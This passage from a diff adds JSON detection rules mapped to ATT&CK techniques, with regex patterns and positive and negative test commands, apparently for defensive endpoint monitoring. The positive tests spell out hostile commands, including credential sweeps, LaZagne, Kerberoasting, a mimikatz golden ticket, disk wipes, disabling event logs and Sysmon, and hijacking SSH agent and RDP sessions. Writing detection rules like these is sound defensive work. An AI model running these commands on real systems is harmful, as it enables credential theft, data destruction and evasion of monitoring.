+      "command": "curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6.eyJzdWIiOiIxMjM0NTY3ODkw.sig' https://api.corp/x"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl --token=eyJhbGciOiJSUzI1NiIsImtpZCI6.eyJpc3MiOiJrdWJlcm5ldGVz.sig get pods"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -H 'Authorization: Bearer $TOKEN' https://api.corp/x"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://api.corp/x"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-credential-grep-sweep",
+   "name": "Recursive search for password strings in config or home trees",
+   "description": "grep/findstr/Select-String sweeping directories for password, passwd, secret or api_key strings.",
+   "tactic": "Credential Access",
+   "technique": "T1552",
+   "technique_name": "Unsecured Credentials",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(grep|egrep|rg|findstr|select-string|ack)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-[a-z]*r[a-z]*\\s|\\s/[a-z]*s[a-z]*\\s|-recurse|--recursive)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(password|passwd|api_?key|secret_key)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/etc\\b|/home\\b|/var/www|/opt\\b|\\*\\.(config|xml|ini|txt|env)|\\\\users\\\\)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "credentials"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/grep",
+      "command": "grep -ri password /etc"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\findstr.exe",
+      "command": "findstr /si password *.xml *.ini *.config"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/grep",
+      "command": "grep -r TODO src"
+     },
+     {
+      "executable": "/usr/bin/grep",
+      "command": "grep root /etc/passwd"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-gpp-cpassword-search",
+   "name": "Search or dump of Group Policy Preferences cpassword",
+   "description": "findstr /s cpassword over SYSVOL or Get-GPPPassword, which recover reversible passwords stored in GPP XML.",
+   "tactic": "Credential Access",
+   "technique": "T1552.006",
+   "technique_name": "Unsecured Credentials: Group Policy Preferences",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(findstr.*cpassword|get-gpppassword|get-cachedgpppassword|\\\\sysvol\\\\.*(groups|services|scheduledtasks|datasources)\\.xml)"
+   },
+   "tags": [
+    "gap2",
+    "gpp"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\findstr.exe",
+      "command": "findstr /S /I cpassword \\\\corp.local\\sysvol\\corp.local\\policies\\*.xml"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-GPPPassword"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\findstr.exe",
+      "command": "findstr /S /I todo *.txt"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-GPO -All"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-mac-gatekeeper-or-quarantine-bypass",
+   "name": "Gatekeeper disabled or quarantine attribute stripped",
+   "description": "spctl --master-disable or xattr removal of com.apple.quarantine from an app or download.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553",
+   "technique_name": "Subvert Trust Controls",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(spctl)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "--master-disable|--global-disable"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(xattr)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(-d\\s+com\\.apple\\.quarantine|\\s-cr?\\s|\\s-rc\\s)"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "gatekeeper"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --master-disable"
+     },
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -d com.apple.quarantine /Applications/X.app"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --status"
+     },
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -l file.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-selfsigned-code-signing",
+   "name": "Self-signed code-signing certificate created",
+   "description": "New-SelfSignedCertificate -Type CodeSigningCert or makecert with the code-signing EKU. Developers do this, so informational.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.002",
+   "technique_name": "Subvert Trust Controls: Code Signing",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(new-selfsignedcertificate\\s.*codesigningcert|makecert(\\.exe)?\\s.*-eku\\s+1\\.3\\.6\\.1\\.5\\.5\\.7\\.3\\.3)"
+   },
+   "tags": [
+    "gap2",
+    "code-signing"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell New-SelfSignedCertificate -Type CodeSigningCert -Subject CN=x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell New-SelfSignedCertificate -DnsName localhost"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-ChildItem Cert:"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-mark-of-the-web-removal",
+   "name": "Mark-of-the-Web removed",
+   "description": "Unblock-File, or deleting the Zone.Identifier stream, strips the download marker that triggers SmartScreen and Office protections.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.005",
+   "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(powershell|pwsh|cmd)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(unblock-file|remove-item\\s.*-stream\\s+zone\\.identifier|del\\s+.*:zone\\.identifier|set-content\\s.*-stream\\s+zone\\.identifier)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "motw"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Unblock-File C:\\Users\\a\\Downloads\\tool.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-Item C:\\a.txt -Stream *"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-ChildItem"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-code-integrity-policy-disable",
+   "name": "Driver-signing or system integrity enforcement disabled",
+   "description": "bcdedit testsigning/nointegritychecks on or loadoptions DDISABLE_INTEGRITY_CHECKS; csrutil disable.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.006",
+   "technique_name": "Subvert Trust Controls: Code Signing Policy Modification",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(bcdedit)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(testsigning|nointegritychecks)\\s+on|loadoptions\\s+(ddisable_integrity_checks|disable_integrity_checks)"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(csrutil)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\bdisable\\b"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "integrity"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\bcdedit.exe",
+      "command": "bcdedit /set testsigning on"
+     },
+     {
+      "executable": "/usr/bin/csrutil",
+      "command": "csrutil disable"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\bcdedit.exe",
+      "command": "bcdedit /enum"
+     },
+     {
+      "executable": "/usr/bin/csrutil",
+      "command": "csrutil status"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-system-binary-modified",
+   "name": "Core system binary written or replaced",
+   "description": "A write to sshd, ssh, sudo, login, passwd, su, ps, netstat, ss or lsof in a system binary directory; trojanized replacements keep persistence. Package managers also do this, so informational.",
+   "tactic": "Persistence",
+   "technique": "T1554",
+   "technique_name": "Compromise Host Software Binary",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(usr/)?(s?bin|local/bin)/(sshd|ssh|sudo|login|passwd|su|ps|netstat|ss|lsof)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "binary-tamper"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/usr/sbin/sshd",
+      "operation": "modify"
+     },
+     {
+      "path": "/usr/bin/sudo",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/usr/bin/psql",
+      "operation": "modify"
+     },
+     {
+      "path": "/home/a/bin/ssh",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-credential-store-tools",
+   "name": "Credential store extraction tool or command",
+   "description": "LaZagne, keepassxc-cli export, or secret-tool search --all read stored credentials in bulk.",
+   "tactic": "Credential Access",
+   "technique": "T1555",
+   "technique_name": "Credentials from Password Stores",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(^|[\\\\/\\s])(lazagne)(\\.exe|\\.py)?(\\s|$)"
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(keepassxc-cli)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\b(export|db-info)\\b"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(secret-tool)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "search\\s+--all"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "password-store"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\a\\LaZagne.exe",
+      "command": "LaZagne.exe all"
+     },
+     {
+      "executable": "/usr/bin/secret-tool",
+      "command": "secret-tool search --all service ssh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/secret-tool",
+      "command": "secret-tool lookup service ssh"
+     },
+     {
+      "executable": "/usr/bin/keepassxc-cli",
+      "command": "keepassxc-cli --version"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-credential-manager-read",
+   "name": "Windows Credential Manager enumerated",
+   "description": "cmdkey /list, vaultcmd /listcreds, keymgr.dll or Get-VaultCredential read stored Windows credentials.",
+   "tactic": "Credential Access",
+   "technique": "T1555.004",
+   "technique_name": "Credentials from Password Stores: Windows Credential Manager",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(cmdkey(\\.exe)?\\s+/list|vaultcmd(\\.exe)?\\s+/list(creds|properties)|keymgr\\.dll,krshowkeymgr|get-vaultcredential|\\[windows\\.security\\.credentials\\.passwordvault\\])"
+   },
+   "tags": [
+    "gap2",
+    "credman"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmdkey.exe",
+      "command": "cmdkey /list"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\vaultcmd.exe",
+      "command": "vaultcmd /listcreds:Windows"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmdkey.exe",
+      "command": "cmdkey /add:srv /user:a /pass:b"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\vaultcmd.exe",
+      "command": "vaultcmd /?"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-cloud-secret-store-read",
+   "name": "Cloud or cluster secret read from the command line",
+   "description": "aws secretsmanager get-secret-value, az keyvault secret show, gcloud secrets versions access, or kubectl get secret with output of the data.",
+   "tactic": "Credential Access",
+   "technique": "T1555.006",
+   "technique_name": "Credentials from Password Stores: Cloud Secrets Management Stores",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(secretsmanager\\s+get-secret-value|keyvault\\s+secret\\s+(show|download)|secrets\\s+versions\\s+access|kubectl\\s+get\\s+secrets?\\s.*(-o\\s*(yaml|json|jsonpath)|--output))"
+   },
+   "tags": [
+    "gap2",
+    "secrets"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws secretsmanager get-secret-value --secret-id prod/db"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get secret app-tls -o yaml"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws secretsmanager list-secrets"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get secrets"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-kerberos-ticket-tools",
+   "name": "Kerberos ticket abuse tooling",
+   "description": "Rubeus kerberoast/asktgt/dump/tgtdeleg, Invoke-Kerberoast, GetUserSPNs.py or setspn -Q */* request or extract service tickets.",
+   "tactic": "Credential Access",
+   "technique": "T1558",
+   "technique_name": "Steal or Forge Kerberos Tickets",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(rubeus(\\.exe)?\\s+(kerberoast|asktgt|asktgs|dump|tgtdeleg|asreproast|s4u)|invoke-kerberoast|getuserspns(\\.py)?\\s|getnpusers(\\.py)?\\s|setspn(\\.exe)?\\s+.*-q\\s+\\*/\\*)"
+   },
+   "tags": [
+    "gap2",
+    "kerberos"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\a\\Rubeus.exe",
+      "command": "Rubeus.exe kerberoast /outfile:h.txt"
+     },
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 GetUserSPNs.py corp/user:pw -request"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\setspn.exe",
+      "command": "setspn -L svc"
+     },
+     {
+      "executable": "/usr/bin/klist",
+      "command": "klist"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-golden-ticket-forge",
+   "name": "Golden ticket forging command",
+   "description": "mimikatz kerberos::golden, ticketer.py with -domain-sid, or Rubeus golden.",
+   "tactic": "Credential Access",
+   "technique": "T1558.001",
+   "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
+   "severity": "critical",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(kerberos::golden|ticketer(\\.py)?\\s+.*-domain-sid|rubeus(\\.exe)?\\s+golden)"
+   },
+   "tags": [
+    "gap2",
+    "kerberos"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\a\\mimikatz.exe",
+      "command": "mimikatz kerberos::golden /domain:corp.local /sid:S-1-5-21-1 /krbtgt:abc /user:x"
+     },
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 ticketer.py -nthash abc -domain-sid S-1-5-21-1 -domain corp.local admin"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 ticketer.py --help"
+     },
+     {
+      "executable": "/usr/bin/klist",
+      "command": "klist tickets"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-encrypted-archive-staging",
+   "name": "Password-protected archive created",
+   "description": "7z a -p, rar a -hp or zip -P/-e over a directory, a common way to stage data so inspection fails. Users also encrypt archives, so informational.",
+   "tactic": "Collection",
+   "technique": "T1560",
+   "technique_name": "Archive Collected Data",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(7z|7za|7zr)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\sa\\s.*-p\\S*"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(rar|winrar)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\sa\\s.*-hp\\S*"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(zip)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s(-P\\s*\\S+|-e\\b|--password)"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "archive"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/7z",
+      "command": "7z a -pSecret123 out.7z /home/a/docs"
+     },
+     {
+      "executable": "/usr/bin/zip",
+      "command": "zip -P pw out.zip data/"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/7z",
+      "command": "7z a out.7z docs"
+     },
+     {
+      "executable": "/usr/bin/zip",
+      "command": "zip -r out.zip data/"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-raw-disk-structure-wipe",
+   "name": "Raw disk or partition table overwrite",
+   "description": "dd/wipefs/sgdisk/diskpart clean targeting a whole disk device, which destroys partition structure.",
+   "tactic": "Impact",
+   "technique": "T1561.002",
+   "technique_name": "Disk Wipe: Disk Structure Wipe",
+   "severity": "critical",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(dd)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "of=/dev/(sd[a-z]|nvme\\d+n\\d+|vd[a-z]|disk\\d+|xvd[a-z])(\\s|$)"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(wipefs)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s-a\\s.*/dev/(sd[a-z]|nvme\\d|vd[a-z])"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(sgdisk)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(--zap-all|-Z)\\b"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(diskpart)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "clean( all)?"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "wipe"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/dd",
+      "command": "dd if=/dev/zero of=/dev/sda bs=1M"
+     },
+     {
+      "executable": "/usr/sbin/wipefs",
+      "command": "wipefs -a /dev/nvme0n1"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/dd",
+      "command": "dd if=/dev/zero of=./test.img bs=1M count=10"
+     },
+     {
+      "executable": "/bin/dd",
+      "command": "dd if=/dev/sda of=./backup.img"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-eventlog-service-disabled",
+   "name": "Windows event logging disabled",
+   "description": "auditpol /clear or disable, wevtutil sl /e:false, sc config eventlog start= disabled, or Stop-Service EventLog.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.002",
+   "technique_name": "Impair Defenses: Disable Windows Event Logging",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(auditpol)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "/(clear|remove)\\b|/(success|failure):disable"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(wevtutil)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\bsl\\s+\\S+\\s+/e:false"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(sc)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "config\\s+eventlog\\s+start=\\s*disabled"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(powershell|pwsh)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(stop|set)-service\\s+.*eventlog"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "logging"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\auditpol.exe",
+      "command": "auditpol /clear /y"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\wevtutil.exe",
+      "command": "wevtutil sl Security /e:false"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\auditpol.exe",
+      "command": "auditpol /get /category:*"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\wevtutil.exe",
+      "command": "wevtutil qe Security /c:5"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-etw-or-sensor-blinding",
+   "name": "Event tracing or sensor-driver blinding",
+   "description": "logman stop/delete of an ETW trace, fltmc unload of a sensor minifilter, COMPlus_ETWEnabled=0, or Set-EtwTraceProvider disabling providers.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.006",
+   "technique_name": "Impair Defenses: Indicator Blocking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(logman(\\.exe)?\\s+(stop|delete)\\s+\\S*(etw|trace|eventlog-)|fltmc(\\.exe)?\\s+unload\\s+(sysmon\\w*|windefend|mssecflt|wdfilter)|complus_etwenabled\\s*=\\s*0|set-etwtraceprovider\\s)"
+   },
+   "tags": [
+    "gap2",
+    "etw"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\fltmc.exe",
+      "command": "fltmc unload SysmonDrv"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'export COMPlus_ETWEnabled=0; ./app'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\fltmc.exe",
+      "command": "fltmc filters"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\logman.exe",
+      "command": "logman query -ets"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-cloud-firewall-open-to-world",
+   "name": "Cloud firewall or security group opened to the world",
+   "description": "aws ec2 authorize-security-group-ingress, gcloud firewall-rules create/update, or az network nsg rule create with 0.0.0.0/0 or * source.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.007",
+   "technique_name": "Impair Defenses: Disable or Modify Cloud Firewall",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(aws|gcloud|az)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(authorize-security-group-ingress|firewall-rules\\s+(create|update)|nsg\\s+rule\\s+(create|update))"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(0\\.0\\.0\\.0/0|::/0|--source-address-prefixes?\\s+('?\\*'?|internet)\\b)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "cloud-firewall"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws ec2 authorize-security-group-ingress --group-id sg-1 --protocol tcp --port 22 --cidr 0.0.0.0/0"
+     },
+     {
+      "executable": "/usr/bin/gcloud",
+      "command": "gcloud compute firewall-rules create open --source-ranges 0.0.0.0/0 --allow tcp:22"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws ec2 authorize-security-group-ingress --group-id sg-1 --protocol tcp --port 22 --cidr 10.0.0.0/8"
+     },
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws ec2 describe-security-groups"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-ssh-agent-socket-hijack",
+   "name": "SSH agent socket of another session used",
+   "description": "SSH_AUTH_SOCK is set to a /tmp/ssh-*/agent.* socket on the command line, using someone else's forwarded agent.",
+   "tactic": "Lateral Movement",
+   "technique": "T1563.001",
+   "technique_name": "Remote Service Session Hijacking: SSH Hijacking",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "ssh_auth_sock=/tmp/ssh-[a-z0-9]+/agent\\.\\d+"
+   },
+   "tags": [
+    "gap2",
+    "ssh-agent"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "SSH_AUTH_SOCK=/tmp/ssh-XXabc123/agent.4242 ssh admin@10.0.0.7"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh admin@10.0.0.7"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "echo $SSH_AUTH_SOCK"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-tscon-session-takeover",
+   "name": "tscon takes over another session",
+   "description": "tscon <id> /dest: moves another user's RDP session to the caller without credentials when run as SYSTEM.",
+   "tactic": "Lateral Movement",
+   "technique": "T1563.002",
+   "technique_name": "Remote Service Session Hijacking: RDP Hijacking",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(tscon)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b\\d+\\s+/dest:"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "rdp"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\tscon.exe",
+      "command": "tscon 2 /dest:rdp-tcp#5"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\tscon.exe",
+      "command": "tscon 2"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\query.exe",
+      "command": "query session"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-hide-file-attribute",
+   "name": "Files hidden through attributes",
+   "description": "attrib +h +s, chflags hidden or SetFile -a V applied to hide payloads or folders from default listings.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564",
+   "technique_name": "Hide Artifacts",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(attrib)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\+h\\b.*\\+s\\b|\\+s\\b.*\\+h\\b"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(chflags)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\bhidden\\b"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
